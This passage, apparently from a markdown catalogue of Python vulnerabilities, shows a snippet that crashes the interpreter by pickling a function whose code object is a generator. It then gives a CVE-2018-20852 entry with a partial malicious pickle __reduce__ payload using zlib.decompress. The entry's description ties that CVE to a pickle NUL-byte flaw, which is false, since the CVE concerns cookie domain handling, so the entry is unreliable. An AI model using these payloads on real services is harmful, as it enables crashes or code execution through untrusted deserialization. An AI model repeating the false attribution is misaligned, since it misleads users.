fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi

import pickle
pickle.dumps(fn)
# segfault
```

### CVE-2018-20852

[Unpickling arbitrary objects](https://nvd.nist.gov/vuln/detail/CVE-2018-20852)

The pickle module in Python 3.5 through 3.7 interprets a \x00 byte after a
pickled object's CLASS opcode as an end-of-string marker, allowing an attacker to
construct a bytes object that contains embedded NULL bytes, and then cause an
unintended object to be unpickled when the bytes object is passed to the loads
function.

```python
import pickle
import zlib

class exploit(object):
    def __reduce__(self):
        return (zlib.decompress, (b'x\x9c\x0b\xca\xcf\xf4\xce\xcf\xcb\xccK\xcd\xcf\xc8\x0c\rM\xce\xcc\xcf\xc9\xccK
